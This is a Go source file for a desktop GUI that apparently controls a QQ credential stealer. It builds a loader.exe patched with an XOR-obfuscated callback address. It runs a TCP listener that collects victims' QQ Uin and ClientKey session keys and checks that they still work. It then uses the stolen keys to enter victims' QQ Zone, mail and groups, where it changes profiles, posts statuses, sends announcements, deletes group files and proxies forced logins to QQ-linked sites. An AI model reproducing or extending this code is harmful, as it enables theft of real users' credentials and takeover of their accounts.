package FyneGUI

import (
	"bufio"
	"bytes"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"image/color"
	"math/rand"
	"net"
	"os"
	"qkey/Fonts"
	"qkey/QQKeyTool"
	"qkey/SunnyNet"
	"qkey/client"
	"qkey/gui"
	"strings"
	"time"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/canvas"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/layout"
	"fyne.io/fyne/v2/storage"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"
	"github.com/go-ini/ini"
)

var a fyne.App
var w fyne.Window
var Q_uin string
var Q_key string

type customTheme struct {
	defaultTheme fyne.Theme
	fontRegular  fyne.Resource
}

func (c *customTheme) Font(style fyne.TextStyle) fyne.Resource {
	if style.Monospace {
		return theme.DefaultTheme().Font(style)
	}
	if style.Bold {
		// return c.fontBold
	}
	return c.fontRegular
}

func (c *customTheme) Color(name fyne.ThemeColorName, variant fyne.ThemeVariant) color.Color {
	return theme.DefaultTheme().Color(name, variant)
}

func (c *customTheme) Icon(name fyne.ThemeIconName) fyne.Resource {
	return theme.DefaultTheme().Icon(name)
}

func (c *customTheme) Size(name fyne.ThemeSizeName) float32 {
	return theme.DefaultTheme().Size(name)
}

var (
	key = []byte{0x62, 0x61, 0x69, 0x6C, 0x31, 0x62, 0x61, 0x69, 0x6C, 0x32, 0x62, 0x61, 0x69, 0x6C, 0x33, 0x62, 0x61, 0x69, 0x6C, 0x34}

	XorDecrypt = func(data []byte) string {
		result := make([]byte, len(data))
		for i := 0; i < len(data); i++ {
			result[i] = data[i] ^ key[i%len(key)]
		}

		return string(result)
	}
)

func Creategetqkey(ipport string) {
	fiport := XorDecrypt([]byte(ipport))
	ffiport := hex.EncodeToString([]byte(fiport))
	replacements := []struct {
		oldStr string
		newStr string
	}{
		{"[x]000000000000000000000000000000000000000000000000000000000000[x]", ffiport},
		{"[r]0000000000000000000000000000000000000[r]", randStr(len("[r]0000000000000000000000000000000000000[r]"))},
	}

	data := client.LoaderData

	for _, repl := range replacements {
		oldBytes := []byte(repl.oldStr)
		newBytes := []byte(repl.newStr)

		if len(newBytes) < len(oldBytes) {
			newBytes = append(newBytes, bytes.Repeat([]byte{' '}, len(oldBytes)-len(newBytes))...)
		} else if len(newBytes) > len(oldBytes) {
			fmt.Println("上线地址过长!")
			continue
		}
		if bytes.Contains(data, oldBytes) {
			data = bytes.ReplaceAll(data, oldBytes, newBytes)

		}
	}

	err := os.WriteFile("loader.exe", data, 0755)
	if err != nil {
		fmt.Printf("无法写入文件: %v\n", err)
		return
	}

	fmt.Printf("生成成功: %s\n", "loader.exe")
}
func Listenport(port string) {
	listener, err := net.Listen("tcp", "localhost:"+port)
	if err != nil {
		fmt.Println("Listener error:", err)
		os.Create("err.log")
		os.WriteFile("err.log", []byte(err.Error()), 0755)
		os.Exit(0)
	}
	defer func(listener net.Listener) {
		err := listener.Close()
		if err != nil {

		}
	}(listener)
	fmt.Println("Listening on localhost:" + port)
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Accept error:", err)
			continue
		}
		fmt.Println("Accept connection from ", conn.RemoteAddr())
		Fdata := []byte(hex.EncodeToString([]byte(XorDecrypt([]byte("Get")))) + "\n")
		fmt.Println(Fdata)
		_, err = conn.Write(Fdata)
		if err != nil {
			fmt.Println(err)
		}
		go handleConnection(conn)
	}
}

var lastcontent string

func handleConnection(conn net.Conn) {
	defer func(conn net.Conn) {
		err := conn.Close()
		if err != nil {

		}
	}(conn) // 确保连接关闭

	//conn.SetDeadline(time.Now().Add(30 * time.Second))

	reader := bufio.NewReader(conn)

	for {
		message, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Read error:", err)
			return
		}

		re, _ := hex.DecodeString(message)

		if string(re) == lastcontent {
			fmt.Println("重复数据")
			return
		}

		fmt.Printf("Received：%s\n", message)

		Received(XorDecrypt(re))
		lastcontent = string(re)
		//response := fmt.Sprintf("Server processed: %s", message)
		//_, err = conn.Write([]byte(response))
		//if err != nil {
		//	fmt.Println("Write error:", err)
		//	return
		//}
	}
}

var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func randStr(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

const cfgloca = "Config.ini"

func Countdown(timestamp int64) {
	var inputTime time.Time
	if timestamp > 1e18 {
		inputTime = time.Unix(0, timestamp)
	} else if timestamp > 1e9 {
		inputTime = time.Unix(timestamp, 0)
	} else {
		inputTime = time.Unix(timestamp, 0)
	}

	targetDuration := 1*time.Hour + 57*time.Minute
	targetTime := inputTime.Add(targetDuration)

	now := time.Now()

	remaining := targetTime.Sub(now)

	if remaining <= 0 {
		if QQKeyTool.Loginqkey(Q_uin, Q_key) {
			t := fmt.Sprintf("黄桃罐头|Key-未失效")
			fyne.Do(func() {
				w.SetTitle(t)
			})
		} else {
			t := fmt.Sprintf("黄桃罐头|Key-已失效")
			fyne.Do(func() {
				w.SetTitle(t)
			})
		}

		return
	}

	if remaining < targetDuration {

		targetDuration = remaining
	}

	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	for remainingTime := targetDuration; remainingTime > 0; {
		select {
		case <-ticker.C:
			remainingTime -= time.Second
			hours := int(remainingTime.Hours())
			minutes := int(remainingTime.Minutes()) % 60
			seconds := int(remainingTime.Seconds()) % 60
			t := fmt.Sprintf("%02d:%02d:%02d", hours, minutes, seconds)
			fyne.Do(func() {
				w.SetTitle("黄桃罐头|" + t)
			})
		}
	}

}

func createcfg(address string, port string) {
	cfg := ini.Empty()
	section1 := cfg.Section("CFG")
	section1.Key("address").SetValue(address)
	section1.Key("port").SetValue(port)

	filename := cfgloca
	if err := cfg.SaveTo(filename); err != nil {
		panic(err)
	}
}
func loadcfg() (address string, port string) {
	cfg, err := ini.Load(cfgloca)
	if err != nil {
		fmt.Printf("Fail to read file: %v", err)
		os.Exit(1)
	}
	address = cfg.Section("CFG").Key("address").String()
	port = cfg.Section("CFG").Key("port").String()
	return address, port
}
func FileExist(fileName string) bool {

	_, err := os.Stat(fileName)
	if err != nil {
		if os.IsNotExist(err) {
			return false
		} else {
			return false
		}
	}

	return true
}
func Cnm() {
	fmt.Println("cnmm")
}
func Loadgui() {
	if !FileExist(cfgloca) {
		createcfg("127.0.0.1:11451", "11451")
	}
	_, port := loadcfg()
	go Listenport(port)
	a = app.New()
	w = a.NewWindow("黄桃罐头")
	w.SetCloseIntercept(func() {
		SunnyNet.DisableWindowsProxy()
		w.Close()
	})
	logo := fyne.NewStaticResource("logo.png", gui.LOGO())
	w.SetIcon(logo)
	w.SetPadded(false)
	fontRegular := fyne.NewStaticResource("f.ttf", Fonts.FontData)
	a.Settings().SetTheme(&customTheme{
		defaultTheme: theme.DefaultTheme(),
		fontRegular:  fontRegular,
	})

	tabs := container.NewAppTabs(
		container.NewTabItem("登录", qkeylistContent()),
		container.NewTabItem("空间相关", qzoneContent()),
		container.NewTabItem("群管理", qunContent()),
		container.NewTabItem("强登", loginContent()),
		container.NewTabItem("生成/设置", createContent()),
	)
	w.SetContent(tabs)
	w.Resize(fyne.NewSize(500, 400))
	w.ShowAndRun()
}

var (
	Onlinedata = []ReceivedItem{}
	onlinelist = widget.NewList(
		func() int {
			return len(Onlinedata)
		},
		func() fyne.CanvasObject {
			return widget.NewLabel("")
		},
		func(i widget.ListItemID, o fyne.CanvasObject) {
			o.(*widget.Label).SetText(Onlinedata[i].Reuin)
		})
)

type ReceivedItem struct {
	Time  int64
	Reuin string
	Rekey string
}

func GetBetweenStr(str, start, end string) string {
	n := strings.Index(str, start)
	if n == -1 {
		n = 0
	} else {
		n = n + len(start)
	}
	str = string([]byte(str)[n:])
	m := strings.Index(str, end)
	if m == -1 {
		m = len(str)
	}
	str = string([]byte(str)[:m])
	return str
}
func RemoveDuplicates(items []ReceivedItem) []ReceivedItem {

	seen := make(map[string]struct{})
	writeIdx := 0
	for _, item := range items {

		k := fmt.Sprintf("%s-%s", item.Reuin, item.Rekey)

		if !QQKeyTool.Loginqkey(item.Reuin, item.Rekey) {
			fmt.Println(item.Reuin + item.Rekey + "失效!")
			continue
		}

		if _, exists := seen[k]; !exists {
			seen[k] = struct{}{}
			items[writeIdx] = item
			writeIdx++
		}
	}

	return items[:writeIdx]
}

func Received(content string) {
	type Client struct {
		Uin string `json:"Uin"`
		Key string `json:"Key"`
	}
	type Result struct {
		Time   int64    `json:"Time"`
		Client []Client `json:"Client"`
	}
	var res Result
	err := json.Unmarshal([]byte(content), &res)
	if err != nil {
		fmt.Printf("解析失败: %v\n", err)
		return
	}

	//fmt.Printf("时间戳: %d\n", res.Time)
	for _, client := range res.Client {
		if !QQKeyTool.Loginqkey(client.Uin, client.Key) {
			return
		}
		result := []ReceivedItem{
			{
				Time:  res.Time,
				Reuin: client.Uin,
				Rekey: client.Key,
			},
		}

		Onlinedata = RemoveDuplicates(append(Onlinedata, result...))

	}

	fyne.Do(func() {
		onlinelist.Refresh()
	})

}
func qkeylistContent() *fyne.Container {
	var temptime int64
	uinEntry := widget.NewEntry()
	uinEntry.SetPlaceHolder("Uin")

	keyEntry := widget.NewPasswordEntry()
	keyEntry.SetPlaceHolder("ClientKey")

	loginBtn := widget.NewButtonWithIcon("登入", theme.ConfirmIcon(),
		func() {
			keyEntry.Refresh()
			uinEntry.Refresh()
			if QQKeyTool.Loginqkey(uinEntry.Text, keyEntry.Text) {
				dialog.ShowInformation("Info", "Login Successfully", w)
				Q_uin = uinEntry.Text
				Q_key = keyEntry.Text
				if temptime != 0 {
					go Countdown(temptime)
				}

			} else {
				dialog.ShowInformation("Info", "Login Failed", w)
			}

		})
	reBtn := widget.NewButton("刷新",
		func() {
			Onlinedata = RemoveDuplicates(Onlinedata)
			onlinelist.Refresh()

		})
	// 添加点击事件处理
	onlinelist.OnSelected = func(id widget.ListItemID) {
		//fmt.Printf("11点击了第 %d 项，内容是: %s\n", id, data[id].Title)
		//mt.Printf("点击了第 %d 项，内容是: %s\n", id, data[id].HiddenValue)
		uinEntry.SetText(Onlinedata[id].Reuin)
		keyEntry.SetText(Onlinedata[id].Rekey)
		temptime = Onlinedata[id].Time
		// 在这里可以添加你需要执行的代码
	}

	//qunContenct := container.NewVBox(list, ggEntry, ggBtn)
	//qun := container.NewGridWithColumns(1, list, ggEntry, ggBtn)
	content := container.NewGridWithColumns(2, onlinelist,
		container.NewVBox(uinEntry, keyEntry, loginBtn, widget.NewSeparator(), reBtn),
	)
	return content
}

func createContent() *fyne.Container {
	address, port := loadcfg()
	portinput := widget.NewEntry()

	portLable := widget.NewLabel("监听端口")
	portinput.SetText(port)

	sportinput := widget.NewEntry()
	sportLable := widget.NewLabel("上线地址")
	sportinput.SetText(address)

	createBtn := widget.NewButton("生成", func() {
		sportinput.Refresh()
		if sportinput.Text == "" {
			fmt.Println("未输入有效上线地址")
			return
		}
		Creategetqkey(sportinput.Text)

		//IDinput.Refresh()
		//QQKeyTool.ChangeID(Q_uin, Q_key, IDinput.Text)
	})
	savecfgBtn := widget.NewButton("保存配置", func() {
		portinput.Refresh()
		if portinput.Text == "" || sportinput.Text == "" {
			fmt.Println("未输入有效的监听端口/上线地址")
			return
		}
		createcfg(sportinput.Text, portinput.Text)
		SunnyNet.DisableWindowsProxy()
		w.Close()
		os.Exit(0)

	})
	qzone := container.NewGridWithColumns(1,
		container.NewVBox(sportLable, sportinput, createBtn, portLable, portinput, savecfgBtn),
	)
	return qzone
}

func hasLogin() bool {
	if Q_uin == "" || Q_key == "" {
		return false
	}
	return true
}

func QQinfo(app fyne.App) {

	window := app.NewWindow("QQInfo")

	imageURI, err := storage.ParseURI(fmt.Sprintf("http://q.qlogo.cn/headimg_dl?dst_uin=%s&spec=640&img_type=jpg", Q_uin))
	if err != nil {
		fyne.LogError("解析图片URI失败", err)
	}
	image := canvas.NewImageFromURI(imageURI)
	image.FillMode = canvas.ImageFillContain
	image.SetMinSize(fyne.NewSize(100, 100))

	circleContainer := container.NewStack(image)
	//circleContainer.SetMinSize(fyne.NewSize(200, 200))
	circleContainer.Resize(fyne.NewSize(200, 200))

	IDentry := widget.NewEntry()
	IDentry.SetPlaceHolder("昵称")

	Companyentry := widget.NewEntry()
	Companyentry.SetPlaceHolder("公司")

	button := widget.NewButtonWithIcon("修改资料", theme.ConfirmIcon(), func() {
		Companyentry.Refresh()
		IDentry.Refresh()
		QQKeyTool.ChangeQQINFO(Q_uin, Q_key, IDentry.Text, Companyentry.Text)
	})

	// 布局

	content := container.NewGridWithColumns(1,
		container.NewVBox(container.NewCenter(circleContainer),
			widget.NewSeparator(),
			IDentry,
			Companyentry,
			widget.NewSeparator(),
			button),
	)
	window.SetContent(content)

	//window.Resize(fyne.NewSize(400, 600))
	window.Show()
}

func qzoneContent() *fyne.Container {

	changeBtn := widget.NewButton("修改资料", func() {
		if hasLogin() {
			QQinfo(a)
		}

		//IDinput.Refresh()
		//QQKeyTool.ChangeID(Q_uin, Q_key, IDinput.Text)
	})

	SSinput := widget.NewMultiLineEntry()
	SSinput.SetPlaceHolder("要发布的说说")

	sign := widget.NewCheck("设置为签名", func(checked bool) {
	})
	changessBtn := widget.NewButton("发布", func() {
		sign.Refresh()
		QQKeyTool.SendSS(Q_uin, Q_key, SSinput.Text, sign.Checked)

	})
	qzone := container.NewGridWithColumns(1,
		container.NewVBox(SSinput, sign, changessBtn, changeBtn),
	)
	return qzone
}

func qunContent() *fyne.Container {

	qunidEntry := widget.NewEntry()
	qunidEntry.SetPlaceHolder("群号")
	ggEntry := widget.NewMultiLineEntry()
	ggEntry.Resize(fyne.NewSize(50, 2))
	ggEntry.SetPlaceHolder("公告内容")
	ggBtn := widget.NewButton("发送公告", func() {
		qunidEntry.Refresh()
		ggEntry.Refresh()
		QQKeyTool.SendGG(Q_uin, Q_key, qunidEntry.Text, ggEntry.Text)
		QQKeyTool.GetGG(Q_uin, Q_key, qunidEntry.Text)
	})
	getggEntry := widget.NewMultiLineEntry()
	getggEntry.Hidden = true
	getggBtn := widget.NewButton("获取公告", func() {
		qunidEntry.Refresh()
		ggEntry.Refresh()
		getggEntry.Text = QQKeyTool.GetGG(Q_uin, Q_key, qunidEntry.Text)
		getggEntry.Refresh()
		getggEntry.Hidden = false

	})

	data := []QQKeyTool.GroupItem{}
	grouplist := widget.NewList(
		func() int {
			return len(data)
		},
		func() fyne.CanvasObject {
			return widget.NewLabel("")
		},
		func(i widget.ListItemID, o fyne.CanvasObject) {
			o.(*widget.Label).SetText(data[i].Groupname)
		})
	// 添加点击事件处理
	grouplist.OnSelected = func(id widget.ListItemID) {
		//fmt.Printf("11点击了第 %d 项，内容是: %s\n", id, data[id].Title)
		//mt.Printf("点击了第 %d 项，内容是: %s\n", id, data[id].HiddenValue)
		qunidEntry.SetText(data[id].Qid)
		// 在这里可以添加你需要执行的代码
	}
	qunreBtn := widget.NewButton("刷新群列表", func() {

		data = QQKeyTool.GetGroupList(Q_uin, Q_key)
		grouplist.Refresh()
	})
	getfileBtn := widget.NewButton("群文件", func() {
		qunidEntry.Refresh()
		groupfilewindow(a, qunidEntry.Text)

	})
	gsBtn := widget.NewButton("群精华", func() {
		qunidEntry.Refresh()
		essenceContent(a, qunidEntry.Text)
	})
	guBtn := widget.NewButton("群链接", func() {
		qunidEntry.Refresh()
		groupurlContent(a, qunidEntry.Text)
	})
	//qunContenct := container.NewVBox(list, ggEntry, ggBtn)
	//qun := container.NewGridWithColumns(1, list, ggEntry, ggBtn)
	content := container.NewGridWithColumns(3, grouplist,
		container.NewVBox(
			qunidEntry,
			ggEntry,
			ggBtn,
			qunreBtn,
			getggBtn,
			getfileBtn,
			gsBtn,
			guBtn,
		),
		getggEntry,
	)
	return content
}

func groupurlContent(app fyne.App, qid string) {
	window := app.NewWindow("GroupUrl-" + qid)

	textEntry := widget.NewEntry()
	textEntry.SetPlaceHolder("链接")

	urlsData := QQKeyTool.GetGroupUrl(Q_uin, Q_key, qid)
	urllist := widget.NewList(
		func() int {
			return len(urlsData)
		},
		func() fyne.CanvasObject {
			return container.New(
				layout.NewGridLayoutWithColumns(2),
				widget.NewLabel(""),
				widget.NewLabel(""),
			)

		},
		func(i widget.ListItemID, o fyne.CanvasObject) {
			box := o.(*fyne.Container)
			textLabel := box.Objects[0].(*widget.Label)
			senderLabel := box.Objects[1].(*widget.Label)
			textLabel.SetText(urlsData[i].Text)
			senderLabel.SetText(urlsData[i].Sender)

		})

	// 添加点击事件处理
	urllist.OnSelected = func(id widget.ListItemID) {

		textEntry.SetText(urlsData[id].Text)
		textEntry.Refresh()

	}
	sendBtn := widget.NewButton("打开链接", func() {
		textEntry.Refresh()
		QQKeyTool.OpenURL(textEntry.Text)
	})
	//qunContenct := container.NewVBox(list, ggEntry, ggBtn)
	//qun := container.NewGridWithColumns(1, list, ggEntry, ggBtn)
	content := container.NewGridWithColumns(2, urllist,
		container.NewVBox(
			textEntry,
			sendBtn,
		),
	)
	window.SetContent(content)
	window.Resize(fyne.NewSize(500, 500))
	window.Show()
}

func essenceContent(app fyne.App, qid string) {
	window := app.NewWindow("GroupEssence-" + qid)

	textEntry := widget.NewMultiLineEntry()
	textEntry.SetPlaceHolder("消息内容/图片链接")
	targetqidEntry := widget.NewEntry()
	targetqidEntry.SetText(qid)

	essenceData := QQKeyTool.GetGroupessence(Q_uin, Q_key, qid, false)

	essencelist := widget.NewList(
		func() int {
			return len(essenceData)
		},
		func() fyne.CanvasObject {
			label1 := widget.NewLabel("")
			label1.Wrapping = fyne.TextWrapWord
			label2 := widget.NewLabel("")
			label2.Wrapping = fyne.TextWrapWord
			return container.New(
				layout.NewGridLayoutWithColumns(2),
				label1,
				label2,
			)

		},
		func(i widget.ListItemID, o fyne.CanvasObject) {
			box := o.(*fyne.Container)
			textLabel := box.Objects[0].(*widget.Label)
			senderLabel := box.Objects[1].(*widget.Label)
			textLabel.SetText(essenceData[i].Text)
			senderLabel.SetText(essenceData[i].Sender)
			go func() {
				fyne.Do(func() {
					o.Refresh()
				})
			}()
		},
	)

	var tempreqm string
	var temprandomm string
	// 添加点击事件处理
	essencelist.OnSelected = func(id widget.ListItemID) {
		//fmt.Printf("11点击了第 %d 项，内容是: %s\n", id, data[id].Title)

		//qunidEntry.SetText(data[id].Qid)
		tempreqm = essenceData[id].Req_Msg
		temprandomm = essenceData[id].Random_Msg
		textEntry.SetText(essenceData[id].Text)
		textEntry.Refresh()
		// 在这里可以添加你需要执行的代码
	}

	sendBtn := widget.NewButton("转发群精华", func() {
		QQKeyTool.SendGroupessence(Q_uin, Q_key, qid, tempreqm, temprandomm, targetqidEntry.Text)
	})
	createHtml := widget.NewButton("生成可视化Html", func() {
		QQKeyTool.GetGroupessence(Q_uin, Q_key, qid, true)
	})

	openBtn := widget.NewButton("打开图链", func() {
		textEntry.Refresh()
		QQKeyTool.OpenURL(textEntry.Text)
	})
	//qunContenct := container.NewVBox(list, ggEntry, ggBtn)
	//qun := container.NewGridWithColumns(1, list, ggEntry, ggBtn)
	content := container.NewGridWithColumns(2, essencelist,
		container.NewVBox(widget.NewSeparator(),
			textEntry,
			targetqidEntry,
			createHtml,
			openBtn,
			sendBtn,
		),
	)

	window.SetContent(content)
	window.Resize(fyne.NewSize(500, 500))
	window.Show()
}

func groupfilewindow(app fyne.App, qid string) {
	window := app.NewWindow("GroupFileList-" + qid)
	filedata := QQKeyTool.GetFilelist(Q_uin, Q_key, qid)
	filelist := widget.NewList(
		func() int {
			return len(filedata)
		},
		func() fyne.CanvasObject {
			return container.New(
				layout.NewGridLayoutWithColumns(5),
				widget.NewLabel(""),
				widget.NewLabel(""),
				widget.NewLabel(""),
				widget.NewLabel(""),
				widget.NewLabel(""))
		},
		func(i widget.ListItemID, o fyne.CanvasObject) {
			box := o.(*fyne.Container)
			nameLabel := box.Objects[0].(*widget.Label)
			memoryLabel := box.Objects[1].(*widget.Label)
			uploadernameLabel := box.Objects[2].(*widget.Label)
			uploaderuinLabel := box.Objects[3].(*widget.Label)
			downloadtimesLabel := box.Objects[4].(*widget.Label)

			nameLabel.SetText(filedata[i].Name)
			memoryLabel.SetText(filedata[i].Memory)
			uploadernameLabel.SetText(filedata[i].Uploadername)
			uploaderuinLabel.SetText(filedata[i].Uploaderuin)
			downloadtimesLabel.SetText(filedata[i].DownloadTimes)
		})

	filelist.OnSelected = func(id widget.ListItemID) {
		pos := getItemPosition(filelist, id, filelist)

		menu := fyne.NewMenu("",
			fyne.NewMenuItem("删除", func() {
				go func() {
					fmt.Println(filedata[id].Busid)
					fmt.Println(filedata[id].Id)
					QQKeyTool.DelFile(Q_uin, Q_key, qid, filedata[id].Busid, filedata[id].Id)
					filedata = QQKeyTool.GetFilelist(Q_uin, Q_key, qid)
					fyne.Do(func() {
						filelist.Refresh()
					})
				}()

			}),
		)

		popup := widget.NewPopUpMenu(menu, window.Canvas())
		popup.ShowAtPosition(pos)
	}

	window.SetContent(filelist)
	window.Resize(fyne.NewSize(500, 500))
	window.Show()
}

func getItemPosition(list *widget.List, id widget.ListItemID, relativeTo fyne.CanvasObject) fyne.Position {
	itemHeight := getListItemHeight(list)
	itemY := float32(id) * itemHeight
	return relativeTo.Position().Add(fyne.NewPos(10, itemY))
}
func getListItemHeight(list *widget.List) float32 {
	item := list.CreateItem()
	item.Resize(fyne.NewSize(10, 10))
	item.Refresh()
	return item.MinSize().Height
}
func loginContent() *fyne.Container {

	qzone := fyne.NewStaticResource("qzone.png", gui.QzoneICON())
	qmail := fyne.NewStaticResource("qmail.png", gui.MAILICON())
	qun := fyne.NewStaticResource("qun.png", gui.QUNICON())

	qzoneBtn := widget.NewButtonWithIcon("QQ空间", qzone, func() {
		QQKeyTool.Loginqzone(Q_uin, Q_key)
		// 按钮点击逻辑
	})
	qmailBtn := widget.NewButtonWithIcon("QQ邮箱", qmail, func() {
		QQKeyTool.Loginmail(Q_uin, Q_key)
		// 按钮点击逻辑
	})
	qunBtn := widget.NewButtonWithIcon("Q群管理", qun, func() {
		QQKeyTool.Loginqun(Q_uin, Q_key)
		// 按钮点击逻辑
	})

	proxyCheck := widget.NewCheck("启动代理", func(checked bool) {
		if checked {
			fmt.Println(Q_uin)
			go SunnyNet.GoProxy(Q_uin, Q_key, true)
		} else {
			go SunnyNet.GoProxy(Q_uin, Q_key, false)
		}
	})

	login := container.NewVBox(
		widget.NewLabel("快捷进入"),
		container.NewHBox(qzoneBtn, qmailBtn, qunBtn),
		widget.NewLabel("强登企鹅网站[所有可用QQ登录的网站]"),
		proxyCheck,
	)
	return login
}
